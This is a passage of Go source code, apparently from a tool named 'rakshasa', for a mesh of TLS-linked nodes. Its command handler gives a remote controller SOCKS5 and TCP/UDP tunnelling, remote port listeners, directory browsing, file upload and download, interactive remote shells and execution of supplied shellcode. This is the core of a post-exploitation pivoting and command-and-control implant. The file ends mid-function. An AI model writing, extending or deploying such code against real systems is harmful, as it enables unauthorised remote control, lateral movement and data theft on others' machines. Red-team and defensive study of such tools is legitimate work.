package server

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"errors"
	"fmt"
	uuid2 "github.com/google/uuid"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"rakshasa/cert"
	"rakshasa/common"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"
)

var (
	currentNode = &node{uuid: uuid2.New().String()}
	clientLock  = &lock{}
	nodeMap     = make(map[string]*node)
	upLevelNode []*node //上游节点
	upNodeWrite = make(chan []byte, 999)
	extNodeIp   []string
	connMap     sync.Map
)

func InitCurrentNode() {
	s := unsafe.Sizeof(uintptr(1))
	bit := " x32"
	if s == 8 {
		bit = " x64"
	}
	rand.Seed(time.Now().Unix())
	currentNode.hostName, _ = os.Hostname()
	if ip, _ := common.ExternalIP(); ip != nil {
		currentNode.addr = ip.String()
	}
	currentNode.goos = runtime.GOOS + bit
	currentNode.mirrorNode = &node{
		id:       currentNode.id,
		uuid:     currentNode.uuid,
		hostName: currentNode.hostName,
		goos:     currentNode.goos,
		addr:     currentNode.addr,
	}
	currentNode.mirrorNode.mirrorNode = currentNode
	nodeMap[currentNode.uuid] = currentNode
	//fmt.Println("当前节点UUID", currentNode.uuid)
	go func() {
		for b := range upNodeWrite {
			for {
				ok := func() bool {

					l := clientLock.Lock()
					defer l.Unlock()

					if len(upLevelNode) == 0 {
						return false
					}
					upLevelNode[0].conn.tlsWrite(b)
					return true
				}()
				if ok {
					break
				}
				time.Sleep(time.Second)
			}

		}
	}()
	nodeTickPing()
	time.AfterFunc(time.Second*10, checkUpLevelNode)
}
func checkUpLevelNode() {

	if len(currentConfig.DstNode) > 0 && len(upLevelNode) == 0 {

		//尝试重新连接节点
		for _, addr := range currentConfig.DstNode {
			connectNew(addr)
		}
		if len(upLevelNode) == 0 {
			//尝试连接其他节点
			if !currentConfig.Limit {
				for _, addr := range extNodeIp {
					if common.Debug {
						fmt.Println("连接extNodeIp", addr)
					}

					connectNew(addr)
					if len(upLevelNode) > 0 {
						return
					}
				}
				func() {

					l := clientLock.RLock()
					defer l.RUnlock()

					for _, n := range nodeMap {
						if n.uuid != currentNode.uuid {
							func() {

								l.RUnlock()
								defer clientLock.RLock(l)

								if len(n.mainIp) == 0 {
									if common.Debug {
										fmt.Println("连接n.addr", fmt.Sprintf("%s:%d", n.addr, n.port))
									}
									connectNew(fmt.Sprintf("%s:%d", n.addr, n.port))
								}
							}()
							if len(upLevelNode) > 0 {
								return
							}
						}
					}
				}()

			}
		}

	}
	time.AfterFunc(time.Second*5, checkUpLevelNode)
}
func nodeTickPing() {

	l := clientLock.RLock()
	defer l.RUnlock()

	now := time.Now().Unix()
	for _, n := range nodeMap {
		if n.uuid != currentNode.uuid {
			for _, ip := range n.mainIp {
				if ip != "" {
					addr1 := fmt.Sprintf("%s:%d", ip, n.port)
					find := false
					for _, addr2 := range extNodeIp {
						if addr1 == addr2 {
							find = true
							break
						}
					}
					if !find {
						extNodeIp = append(extNodeIp, addr1)
					}
				}

			}
			if n.nextPingTime == 0 {
				go n.ping(0)
				n.nextPingTime = now + 10 + rand.Int63n(10)
			} else if n.nextPingTime < now {
				go n.ping(0)
				n.nextPingTime = now + 30 + rand.Int63n(30)
			}

		}

	}
	time.AfterFunc(time.Second*1, nodeTickPing)
}

// 节点
type node struct {
	id                 int
	uuid               string
	hostName           string
	goos               string
	addr               string
	connMap            sync.Map
	udpConnMap         sync.Map
	listenMap          sync.Map //client端会存入clientListen,server存入serverListen
	shellMap           sync.Map
	queryMap           sync.Map
	conn               *Conn
	pingTime, pongTime int64
	mainIp             []string
	port               int
	listen             net.Listener
	nextPingTime       int64

	waitMsg    []*common.Msg //需要等待处理的消息
	mirrorNode *node         //currentNode会生成一个互为mirror的node，以实现client-server功能，比如httpProxy在单节点启动
}
type nodeMsg struct {
	UUID     string
	HostName string
	Addr     string
	MainIp   []string
	Port     int
	Goos     string
}

func connectNew(addr string) (n *node, e error) {
	config := cert.Tlsconfig.Clone()

	conn, err := tls.Dial("tcp", addr, config)
	if err != nil {
		return nil, err
	}

	c := &Conn{nodeConn: conn, isClient: true, nodeaddr: addr, remoteAddr: conn.LocalAddr().String()}
	connMap.Store(c.remoteAddr, conn)
	c.regResult = make(chan error, 1)
	c.regResultNode = make(chan *node, 1)
	c.handle()
	c.reg()
	defer func() {
		if c.node != nil {

			l := clientLock.Lock()
			find := false
			for _, n := range upLevelNode {
				if n.uuid == c.node.uuid {
					find = true
				}
			}
			if !find {
				upLevelNode = append(upLevelNode, c.node)
			}

			l.Unlock()

			resChan := make(chan interface{}, 1)
			id := c.node.storeQuery(resChan)

			c.node.Write(common.CMD_GET_NODE, id, []byte{0})

			select {
			case <-resChan:
				c.node.deleteQuery(id)
				c.node.broadcastNode()
			case <-time.After(common.CMD_TIMEOUT):
				c.node.deleteQuery(id)
				c.node.Close("")
				e = errors.New("time out")
			}

		}
	}()
	select {
	case err = <-c.regResult:
		return nil, err
	case n = <-c.regResultNode:
		return n, err
	case <-time.After(time.Second * 10):
		return nil, errors.New("time out")
	}

}

func (n *node) Write(option uint8, id uint32, b []byte) {
	msg := common.Msg{
		From:       currentNode.uuid,
		To:         n.uuid,
		CmdOpteion: option,
		CmdId:      id,
		CmdData:    b,
	}
	if n.uuid == currentNode.uuid {
		n.mirrorNode.do(&msg)
	} else {
		if n.conn != nil {
			n.conn.OutChan <- msg.Marshal()
		} else {
			upNodeWrite <- msg.Marshal()
		}
	}

}
func (n *node) WriteMsg(msg *common.Msg) {
	if n.conn != nil {
		n.conn.OutChan <- msg.Marshal()
	} else {
		upNodeWrite <- msg.Marshal()
	}
}
func (n *node) do(msg *common.Msg) {

	if common.Debug {
		fmt.Println("client收到", common.CmdToName[msg.CmdOpteion])
	}
	var err error
	//fmt.Println(common.CmdToName[msg.CmdOpteion])
	switch msg.CmdOpteion {
	case common.CMD_CONNECT_BYIDADDR:

		conn := &serverConnect{}

		conn.node = n
		conn.id = msg.CmdId
		conn.write = make(chan *bytes.Buffer, 64)
		conn.close = 0
		conn.windowsSize = 0
		conn.wait = make(chan int)
		n.connMap.Store(conn.id, conn)
		addr := string(msg.CmdData[1:])

		switch common.NetWork(msg.CmdData[0]) {
		case common.SOCKS5_CMD_CONNECT:
			conn.address = addr
			go conn.doConnectTcp(common.SOCKS5_CMD_CONNECT, addr)
		case common.SOCKS5_CMD_UDP:
			go conn.doHandleUdp()
		case common.RAW_TCP:
			go conn.doConnectTcp(common.RAW_TCP, addr)
		case common.RAW_TCP_WITH_PROXY:
			go conn.doConnectTcpWithHttpProxy(common.RAW_TCP_WITH_PROXY, addr)
		case common.SOCKS5_CMD_BIND:
			_l, err := net.Listen("tcp", addr)
			if err != nil {
				n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
				return
			}

			l := &serverListen{listen: _l, node: n, isSocks5: true, id: common.GetID(), replayid: msg.CmdId}

			n.connMap.Delete(conn.id)
			l.socks5Replay = make([]byte, len(msg.CmdData))
			copy(l.socks5Replay, msg.CmdData)
			n.Write(common.CMD_CONNECT_BYIDADDR_RESULT, l.replayid, l.socks5Replay)
			n.listenMap.Store(l.id, l)
			go l.Lisen()
		}
	case common.CMD_CONNECT_BYIDADDR_RESULT:

		if v, ok := n.connMap.Load(msg.CmdId); ok {
			if conn, ok := v.(common.Conn); ok {
				conn.Write(append([]byte{common.CMD_CONNECT_BYIDADDR_RESULT}, msg.CmdData...))
			}
		}
	case common.CMD_CONN_MSG:

		v, ok1 := n.connMap.Load(msg.CmdId)
		conn, ok2 := v.(common.Conn)
		if !ok1 || !ok2 {
			n.Write(common.CMD_DELETE_CONNID, msg.CmdId, nil)
			return
		}
		conn.Write(append([]byte{common.CMD_CONN_MSG}, msg.CmdData...))
	case common.CMD_DELETE_CONNID:
		v, ok := n.connMap.Load(msg.CmdId)
		if ok {
			if conn, ok2 := v.(common.Conn); ok2 {
				conn.Close("对方节点要求关闭")
			} else {
				n.connMap.Delete(msg.CmdId)
			}

		}

	case common.CMD_WINDOWS_UPDATE:
		v, ok := n.connMap.Load(msg.CmdId)
		if ok {
			conn := v.(*serverConnect)
			windows_update_size := int64(msg.CmdData[0]) | int64(msg.CmdData[1])<<8 | int64(msg.CmdData[2])<<16 | int64(msg.CmdData[3])<<24 | int64(msg.CmdData[4])<<32 | int64(msg.CmdData[5])<<40 | int64(msg.CmdData[6])<<48 | int64(msg.CmdData[7])<<56
			if windows_update_size > 0 {
				old := atomic.AddInt64(&conn.windowsSize, windows_update_size) - windows_update_size
				if old < 0 {
					go func() {
						select {
						case conn.wait <- common.CONN_STATUS_OK:
						case <-time.After(time.Second):
						}
					}()
				}
			}

		} else {
			n.Write(common.CMD_DELETE_CONNID, msg.CmdId, nil)
		}

	case common.CMD_REG:
		func() {
			l := clientLock.Lock()
			defer l.Unlock()

			var regmsg common.RegMsg
			err = json.Unmarshal(msg.CmdData, &regmsg)
			if err != nil {
				regmsg.Err = err.Error()
				b, _ := json.Marshal(regmsg)
				n.Write(common.CMD_REG_RESULT, 0, b)
				return
			}
			uuid := regmsg.UUID
			if uuid == currentNode.uuid {
				regmsg.Err = "不能连接自己"
				b, _ := json.Marshal(regmsg)
				n.Write(common.CMD_REG_RESULT, 0, b)
				return
			}

			n.addr = regmsg.Addr
			n.hostName = regmsg.Hostname
			n.mainIp = regmsg.MainIp
			n.port = regmsg.Port
			n.goos = regmsg.Goos

			resultMsg := regmsg
			resultMsg.Addr = currentNode.addr
			resultMsg.UUID = currentNode.uuid
			resultMsg.Hostname = currentNode.hostName
			resultMsg.MainIp = currentNode.mainIp
			resultMsg.Port = currentNode.port
			resultMsg.Goos = currentNode.goos

			b, _ := json.Marshal(resultMsg)
			//返回成功结果
			n.Write(common.CMD_REG_RESULT, 0, b)
			//储存节点
			n.uuid = uuid
			if v, ok := nodeMap[uuid]; !ok || v.conn.closeTag > 0 {
				n.conn.node = n
				nodeMap[regmsg.UUID] = n
				n.broadcastNode()
			}

		}()
	case common.CMD_REG_RESULT:
		var regmsg common.RegMsg
		err = json.Unmarshal(msg.CmdData, &regmsg)

		if err != nil {
			select {
			case n.conn.regResult <- err:
			default:
			}
			return
		}

		if regmsg.Err != "" {
			select {
			case n.conn.regResult <- errors.New(regmsg.Err):

			default:
			}
			return
		}

		//fmt.Printf("connect to %s(%s) success\n", regmsg.UUID, regmsg.RegAddr)
		l := clientLock.Lock()

		n.uuid = regmsg.UUID
		n.addr = regmsg.Addr
		n.hostName = regmsg.Hostname
		n.goos = regmsg.Goos

		workconn := n.conn
		n.mainIp = regmsg.MainIp
		n.port = regmsg.Port
		if v, ok := nodeMap[regmsg.UUID]; ok {
			if v.conn.node != nil && v.conn.node.uuid == regmsg.UUID && v.conn.closeTag == 0 {
				n.uuid = ""          //清空uuid避免正常的node被删
				n.conn.Close("重复注册") //当前的连接关掉
				n.conn = v.conn
				v.mainIp = regmsg.MainIp
				v.port = regmsg.Port
				n = v
			} else {
				n.conn.node = n
			}

		} else {
			n.conn.node = n
		}
		nodeMap[n.uuid] = n
		l.Unlock()

		select {
		case workconn.regResultNode <- n:

		default:
		}

		//回复节点
		n.writeGetNodeResult(msg.CmdId)

	case common.CMD_REMOTE_REG:

		var regmsg common.RegMsg
		err = json.Unmarshal(msg.CmdData, &regmsg)
		if currentConfig.Limit {
			regmsg.Err = "node is in limit mode"
			b, _ := json.Marshal(regmsg)
			n.Write(common.CMD_REMOTE_REG_RESULT, msg.CmdId, b)
			return
		}
		if err == nil {
			var node *node
			node, err = connectNew(regmsg.RegAddr)
			if err == nil {

				regmsg.UUID = node.uuid
				regmsg.Hostname = node.hostName
				regmsg.ViaUUID = currentNode.uuid
				regmsg.MainIp = currentNode.mainIp
				regmsg.Port = currentNode.port
				regmsg.Goos = currentNode.goos
				b, _ := json.Marshal(regmsg)
				n.Write(common.CMD_REMOTE_REG_RESULT, msg.CmdId, b)
			}
		}
		if err != nil {
			regmsg.Err = err.Error()
			b, _ := json.Marshal(regmsg)
			n.Write(common.CMD_REMOTE_REG_RESULT, msg.CmdId, b)
		}
	case common.CMD_REMOTE_REG_RESULT:
		var regmsg common.RegMsg
		err = json.Unmarshal(msg.CmdData, &regmsg)
		v, ok := n.loadQuery(msg.CmdId)
		if !ok {
			return
		}
		if err != nil {
			v <- err
			return
		}
		if regmsg.Err != "" {
			v <- errors.New(regmsg.Err)
			return
		}
		l := clientLock.Lock()

		n.uuid = regmsg.UUID
		n.addr = regmsg.Addr
		n.hostName = regmsg.Hostname
		n.goos = regmsg.Goos
		n.mainIp = regmsg.MainIp
		n.port = regmsg.Port
		if v, ok := nodeMap[regmsg.UUID]; !ok {
			n.conn.node = n
		} else {
			if v.conn.node.uuid == regmsg.UUID && v.conn.closeTag == 0 {
				n.conn.close <- "" //当前的连接关掉
				n.conn = v.conn
				v.mainIp = regmsg.MainIp
				v.port = regmsg.Port
			} else {
				n.conn.node = n
			}

		}
		nodeMap[n.uuid] = n
		l.Unlock()
		//fmt.Printf("connect to %s(%s) success\n", regmsg.UUID, regmsg.RegAddr)
		n.writeGetNodeResult(msg.CmdId)
		n.broadcastNode()
	case common.CMD_PING:
		n.Write(common.CMD_PONG, msg.CmdId, msg.CmdData)
	case common.CMD_NONE:

	case common.CMD_PONG:
		pingTime := int64(msg.CmdData[0]) | int64(msg.CmdData[1])<<8 | int64(msg.CmdData[2])<<16 | int64(msg.CmdData[3])<<24 | int64(msg.CmdData[4])<<32 | int64(msg.CmdData[5])<<40 | int64(msg.CmdData[6])<<48 | int64(msg.CmdData[7])<<56

		if pingTime != n.pingTime {
			return
		}
		n.pongTime = time.Now().Unix()
		if v, ok := n.loadQuery(msg.CmdId); ok {
			select {
			case v <- struct{}{}:
			default:
			}

		}
	case common.CMD_CONN_UDP_MSG:

		_, ok := n.connMap.Load(msg.CmdId)

		if ok {

			var conn common.Conn
			id := uint32(msg.CmdData[0]) | uint32(msg.CmdData[1])<<8 | uint32(msg.CmdData[2])<<16 | uint32(msg.CmdData[3])<<24
			if v2, ok := n.connMap.Load(id); ok {
				conn = v2.(common.Conn)
			} else {
				var ip string
				switch msg.CmdData[4] {
				case 1:
					ip = fmt.Sprintf("%d.%d.%d.%d:%d", msg.CmdData[5], msg.CmdData[6], msg.CmdData[7], msg.CmdData[8], int(msg.CmdData[9])<<8|int(msg.CmdData[10]))

				case 3:
				case 4:
				}
				udpconn := &serverConnect{}
				udpconn.conn, err = net.Dial("udp", ip)
				if err != nil {
					return
				}
				udpconn.node = n
				udpconn.id = id
				udpconn.write = make(chan *bytes.Buffer, 64)
				udpconn.close = 0
				udpconn.windowsSize = 0
				udpconn.wait = make(chan int)

				n.connMap.Store(udpconn.id, udpconn)
				go udpconn.handUdpReceive()
				conn = udpconn
			}
			switch msg.CmdData[4] {
			case 1:
				conn.Write(append([]byte{common.CMD_CONN_UDP_MSG}, msg.CmdData[11:]...))

			}

		}
	case common.CMD_LISTEN:

		//fmt.Println("listen", string(data[common.Headlen+4:]))
		_l, err := net.Listen("tcp", string(msg.CmdData))
		if err != nil {
			n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
			return
		} else {
			n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, []byte{1})
		}
		l := &serverListen{listen: _l, node: n, id: msg.CmdId}
		n.listenMap.Store(msg.CmdId, l)

		go l.Lisen()
	case common.CMD_REMOTE_SOCKS5:

		cfg, err := common.ParseAddr(string(msg.CmdData))
		if err != nil {
			n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
			return
		}
		l := &serverListen{node: n, id: msg.CmdId}
		l.listen, err = StartSocks5WithServer(cfg, n, l.id)
		if err != nil {
			n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
			return
		} else {
			n.Write(common.CMD_LISTEN_RESULT, msg.CmdId, []byte{1})
		}

		n.listenMap.Store(l.id, l)

	case common.CMD_LISTEN_RESULT:

		if v, ok := currentNode.listenMap.Load(msg.CmdId); ok {
			if c, ok := v.(*clientListen); ok {
				if msg.CmdData[0] == 0 {
					select {
					case c.result <- errors.New(string(msg.CmdData[1:])):
					default:
					}

				} else {
					select {
					case c.result <- nil:
					default:
					}

				}

			}
		}

	case common.CMD_DELETE_LISTEN:
		if v, ok := n.listenMap.Load(msg.CmdId); ok {
			switch s := v.(type) {
			case *serverListen:
				s.Close(remoteClose)
			case *clientListen:
				s.Close(remoteClose)
			}

		}
		n.listenMap.Delete(msg.CmdId)
	case common.CMD_DELETE_LISTENCONN_BYID:
		deleteId := uint32(msg.CmdData[0]) | uint32(msg.CmdData[1])<<8 | uint32(msg.CmdData[2])<<16 | uint32(msg.CmdData[3])<<24
		if v, ok := n.listenMap.Load(msg.CmdId); ok {
			if s, ok := v.(*serverListen); ok {
				conn, ok := s.connMap.Load(deleteId)
				if ok {
					conn.(*serverConnect).Close(remoteClose)
					s.connMap.Delete(deleteId)
				}

			}

		}

	case common.CMD_PWD:
		pwd, _ := os.Getwd()
		n.Write(common.CMD_PWD_RESULT, msg.CmdId, []byte(pwd))
	case common.CMD_PWD_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			select {
			case v <- string(msg.CmdData):
			default:
			}

		}
	case common.CMD_GET_NODE:
		n.writeGetNodeResult(msg.CmdId)
	case common.CMD_GET_NODE_RESULT:
		l := clientLock.Lock()
		defer l.Unlock()

		var s []nodeMsg
		err = json.Unmarshal(msg.CmdData, &s)
		if err == nil {
			for _, _n := range s {
				if _n.UUID != currentNode.uuid {
					if v, ok := nodeMap[_n.UUID]; !ok {
						nodeMap[_n.UUID] = newNode(_n, n)
					} else {
						v.hostName = _n.HostName
						v.mainIp = _n.MainIp
						v.port = _n.Port
						if _n.Addr != "" {
							v.addr = _n.Addr
						}
					}

				}

			}
		}
		v, ok := n.loadQuery(msg.CmdId)
		if ok {
			//通知已更新列表
			select {
			case v <- err:
			default:
			}
		}
	case common.CMD_GET_CURRENT_NODE:
		nmsg := nodeMsg{
			UUID:     currentNode.uuid,
			HostName: currentNode.hostName,
			Addr:     currentNode.addr,
			MainIp:   currentNode.mainIp,
			Port:     currentNode.port,
			Goos:     currentNode.goos,
		}
		b, _ := json.Marshal(nmsg)
		n.Write(common.CMD_GET_CURRENT_NODE_RESULT, msg.CmdId, b)

	case common.CMD_ADD_NODE:
		var nmsg nodeMsg
		err = json.Unmarshal(msg.CmdData, &nmsg)

		if err != nil {
			return
		}

		l := clientLock.Lock()
		defer l.Unlock()

		if v, ok := nodeMap[nmsg.UUID]; !ok {

			_n := newNode(nmsg, n)
			nodeMap[nmsg.UUID] = _n

		} else if nmsg.UUID != currentNode.uuid {
			v.port = nmsg.Port
			v.mainIp = nmsg.MainIp
			v.hostName = nmsg.HostName
			v.goos = nmsg.Goos
			if nmsg.Addr != "" {
				v.addr = nmsg.Addr
			}
		}
	case common.CMD_DIR:

		dirPth := string(msg.CmdData)
		dir, err := ioutil.ReadDir(dirPth)
		if err != nil {
			n.Write(common.CMD_DIR_RESULT, msg.CmdId, []byte("读取目录 "+dirPth+" 失败"))
			return
		}
		var s []string
		var maxlen int
		var hasdir string
		for _, fi := range dir {
			if len(fi.Name()) > maxlen {
				maxlen = len(fi.Name())
			}
			if fi.IsDir() {
				hasdir = "      "
			}
		}
		for _, fi := range dir {
			var p string
			name := bytes.Repeat([]byte(" "), maxlen)
			copy(name, fi.Name())
			if fi.IsDir() { // 忽略目录
				p = "<DIR> " + string(name)
			} else {
				p = hasdir + string(name) + "  size:" + strconv.FormatInt(fi.Size(), 10)
			}
			s = append(s, p)
		}
		n.Write(common.CMD_DIR_RESULT, msg.CmdId, []byte(strings.Join(s, "\n")))

	case common.CMD_DIR_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			select {
			case v <- string(msg.CmdData):
			default:
			}

		}

	case common.CMD_CD:
		dirPth := string(msg.CmdData)
		s, err := os.Stat(dirPth)
		if err != nil {
			n.Write(common.CMD_CD_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
			return
		}
		if s.IsDir() {
			n.Write(common.CMD_CD_RESULT, msg.CmdId, append([]byte{1}, dirPth...))
		} else {
			n.Write(common.CMD_CD_RESULT, msg.CmdId, append([]byte{0}, "该路径不是文件夹"...))
		}
	case common.CMD_CD_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			if msg.CmdData[0] == 0 {
				select {
				case v <- errors.New(string(msg.CmdData[1:])):
				default:
				}
			} else {
				select {
				case v <- string(msg.CmdData[1:]):
				default:
				}
			}
		}

	case common.CMD_CONNECT_BYID:
		var l *clientListen
		if v, ok := currentNode.listenMap.Load(msg.CmdId); ok {
			l, _ = v.(*clientListen)
		}
		if l == nil {
			n.Write(common.CMD_DELETE_LISTEN, msg.CmdId, nil)
			return
		}
		//l := clientLock.Lock()
		//b := clientListenMap[id]
		//l.Unlock()
		conn, err := net.Dial("tcp", l.localAddr)
		if err != nil {
			n.Write(common.CMD_DELETE_LISTENCONN_BYID, l.id, msg.CmdData)
			return
		}
		client := &clientConnect{}
		client.id = uint32(msg.CmdData[0]) | uint32(msg.CmdData[1])<<8 | uint32(msg.CmdData[2])<<16 | uint32(msg.CmdData[3])<<24

		client.server = l.server
		client.listenId = msg.CmdId
		client.conn = conn
		client.OnOpened()

		l.connMap.Store(client.id, client)
		l.server.connMap.Store(client.id, client)
		go rawHandleLocal(client)
	case common.CMD_PING_LISTEN:
		if _, ok := n.listenMap.Load(msg.CmdId); !ok {
			//通知客户端服务器listen不存在
			n.Write(common.CMD_PING_LISTEN_RESULT, msg.CmdId, []byte{0})
		}

	case common.CMD_PING_LISTEN_RESULT:
		if value, ok := n.listenMap.Load(msg.CmdId); ok {
			switch v := value.(type) {
			case *clientListen:
				n.Write(v.openOption, v.id, v.openMsg)
				go func() {
					select {
					case res := <-v.result:
						if err, ok := res.(error); ok {
							v.Close(err.Error())
						}
					case <-time.After(common.CMD_TIMEOUT):

						v.Close("listen time out")

					}
				}()
			case *serverListen:
				v.Close(remoteClose)
			}
		}
	case common.CMD_UPLOAD:
		i := bytes.IndexByte(msg.CmdData, 0)
		if i == -1 {
			n.Write(common.CMD_UPLOAD_RESULT, msg.CmdId, append([]byte{0}, "协议错误"...))
			return
		}
		file := string(msg.CmdData[:i])
		offset := int64(msg.CmdData[i+1]) | int64(msg.CmdData[i+2])<<8 | int64(msg.CmdData[i+3])<<16 | int64(msg.CmdData[i+4])<<24 | int64(msg.CmdData[i+5])<<32 | int64(msg.CmdData[i+6])<<40 | int64(msg.CmdData[i+7])<<48 | int64(msg.CmdData[i+8])<<56
		var f *os.File

		if offset == 0 {
			f, err = os.OpenFile(file, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0666)
		} else {
			f, err = os.OpenFile(file, os.O_CREATE|os.O_WRONLY, 0666)
		}
		if err != nil {
			n.Write(common.CMD_UPLOAD_RESULT, msg.CmdId, append([]byte{0}, "写入"+file+"失败 "+err.Error()...))
			return
		}
		defer f.Close()
		f.Seek(offset, 0)
		num, err := f.Write(msg.CmdData[i+9:])
		if err != nil {
			n.Write(common.CMD_UPLOAD_RESULT, msg.CmdId, append([]byte{0}, "写入"+file+"失败 "+err.Error()...))
			return
		}
		if num != len(msg.CmdData[i+9:]) {
			n.Write(common.CMD_UPLOAD_RESULT, msg.CmdId, append([]byte{0}, "写入"+file+"失败 需要写入"+strconv.Itoa(len(msg.CmdData[i+8:]))+" 实际写入"+strconv.Itoa(num)...))
			return
		}
		s, err := os.Stat(file)
		if err == nil {
			n.Write(common.CMD_UPLOAD_RESULT, msg.CmdId, []byte{1, byte(s.Size()), byte(s.Size() >> 8), byte(s.Size() >> 16), byte(s.Size() >> 24), byte(s.Size() >> 32), byte(s.Size() >> 40), byte(s.Size() >> 48), byte(s.Size() >> 56)})
		}

	case common.CMD_UPLOAD_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			if msg.CmdData[0] == 0 {

				select {
				case v <- errors.New(string(msg.CmdData[1:])):
				default:
				}
			} else {
				size := int64(msg.CmdData[1]) | int64(msg.CmdData[2])<<8 | int64(msg.CmdData[3])<<16 | int64(msg.CmdData[4])<<24 | int64(msg.CmdData[5])<<32 | int64(msg.CmdData[6])<<40 | int64(msg.CmdData[7])<<48 | int64(msg.CmdData[8])<<56
				select {
				case v <- size:
				default:
				}
			}

		}
	case common.CMD_DOWNLOAD:
		i := bytes.IndexByte(msg.CmdData, 0)
		file := string(msg.CmdData[:i])
		offset := int64(msg.CmdData[i+1]) | int64(msg.CmdData[i+2])<<8 | int64(msg.CmdData[i+3])<<16 | int64(msg.CmdData[i+4])<<24 | int64(msg.CmdData[i+5])<<32 | int64(msg.CmdData[i+6])<<40 | int64(msg.CmdData[i+7])<<48 | int64(msg.CmdData[i+8])<<56
		var size int64
		if offset == -1 {
			s, err := os.Stat(file)
			if err != nil {
				n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, append([]byte{0}, "读取"+file+"失败 "+err.Error()...))
				return
			}
			if s.IsDir() {
				n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, append([]byte{0}, file+"是一个目录 不可下载"...))
				return
			}
			size = s.Size()
			n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, []byte{1, byte(size), byte(size >> 8), byte(size >> 16), byte(size >> 24), byte(size >> 32), byte(size >> 40), byte(size >> 48), byte(size >> 56)})
		}
		f, err := os.Open(file)
		if err != nil {
			n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, append([]byte{0}, "读取"+file+"失败 "+err.Error()...))
			return
		}
		defer f.Close()
		f.Seek(offset, 0)

		for i := 0; i < 10; i++ {
			buf := make([]byte, common.MAX_PACKAGE-1)
			num, err := f.Read(buf)
			if err != nil {
				if err == io.EOF {

					return
				}
				n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, append([]byte{0}, "读取"+file+"失败 "+err.Error()...))
				return
			}
			n.Write(common.CMD_DOWNLOAD_RESULT, msg.CmdId, append([]byte{2}, buf[:num]...))
		}
	case common.CMD_DOWNLOAD_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			switch msg.CmdData[0] {
			case 0:
				select {
				case v <- errors.New(string(msg.CmdData[1:])):
				default:
				}
			case 1:
				size := int64(msg.CmdData[1]) | int64(msg.CmdData[2])<<8 | int64(msg.CmdData[3])<<16 | int64(msg.CmdData[4])<<24 | int64(msg.CmdData[5])<<32 | int64(msg.CmdData[6])<<40 | int64(msg.CmdData[7])<<48 | int64(msg.CmdData[8])<<56
				select {
				case v <- size:
				default:
				}
			case 2:
				select {
				case v <- msg.CmdData[1:]:
				default:
				}
			}
		}
	case common.CMD_SHELL:
		var param StartCmdParam
		if err = json.Unmarshal(msg.CmdData, &param); err != nil {
			n.Write(common.CMD_SHELL_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
		}
		if err := startCMD(n, msg.CmdId, param); err != nil {
			n.Write(common.CMD_SHELL_RESULT, msg.CmdId, append([]byte{0}, err.Error()...))
		}
	case common.CMD_SHELL_RESULT:

		if v, ok := n.loadQuery(msg.CmdId); ok {

			if msg.CmdData[0] == 0 {
				select {
				case v <- errors.New(string(msg.CmdData[1:])):
				default:
				}
			} else {
				select {
				case v <- msg.CmdData[1:]:

				default:
				}

			}
		}

	case common.CMD_SHELL_DATA:

		if v, ok := n.shellMap.Load(msg.CmdId); ok {
			cmd := v.(*remoteCmd)
			select {
			case cmd.inChan <- msg.CmdData:
			default:
			}
		}
	case common.CMD_RUN_SHELLCODE:
		go func() {
			var s ShellCodeStruct
			err = json.Unmarshal(msg.CmdData, &s)

			if err != nil {
				n.Write(common.CMD_RUN_SHELLCODE_RESULT, msg.CmdId, []byte(err.Error()))
			}
			err = doShellcode(s)
			if err != nil {
				n.Write(common.CMD_RUN_SHELLCODE_RESULT, msg.CmdId, []byte(err.Error()))
			} else {
				n.Write(common.CMD_RUN_SHELLCODE_RESULT, msg.CmdId, nil)
			}
		}()

	case common.CMD_RUN_SHELLCODE_RESULT:
		if v, ok := n.loadQuery(msg.CmdId); ok {
			var err error
			if len(msg.CmdData) > 0 {
				err = errors.New(string(msg.CmdData))
			}

			select {
			case v <- err:
			default:
			}
		}
	default:
		if common.Debug {
			fmt.Println(msg.CmdOpteion, "协议错误")
		}

		n.conn.Close("协议错误")

	}
}
func (n *node) remoteReg(addr string) (newN *node, err error) {
	regmsg := common.RegMsg{
		Addr:    currentNode.addr,
		RegAddr: addr,
		UUID:    currentNode.uuid,
		MainIp:  currentNode.mainIp,
		Port:    currentNode.port,
		Goos:    currentNode.goos,
	}
	regmsg.Hostname, _ = os.Hostname()
	b, _ := json.Marshal(regmsg)
	resChan := make(chan interface{}, 1)
	id := n.storeQuery(resChan)
	n.Write(common.CMD_REMOTE_REG, id, b)
	select {
	case i := <-resChan:
		n.deleteQuery(id)
		if v, ok := i.(error); ok {
			return nil, v
		}
		if v, ok := i.(*node); ok {
			return v, nil
		}

	case <-time.After(common.CMD_TIMEOUT):
		n.deleteQuery(id)
		return nil, errors.New("time out")
	}
	return nil, errors.New("error result")
}
func (n *node) Close(reason string) {
	if n.conn != nil && n.conn.node.uuid == n.uuid {
		n.conn.close <- reason
	}
	n.Delete(reason)
}
func newNode(m nodeMsg, n *node) *node {
	_n := &node{
		uuid:     m.UUID,
		hostName: m.HostName,
		addr:     m.Addr,
		conn:     n.conn,
		pongTime: time.Now().Unix(),
		mainIp:   m.MainIp,
		port:     m.Port,
		goos:     m.Goos,
	}

	return _n
}
func allNodesDo(f func(*node) (bool, error)) (err error) {
	var ok bool

	l := clientLock.RLock()
	defer l.RUnlock()

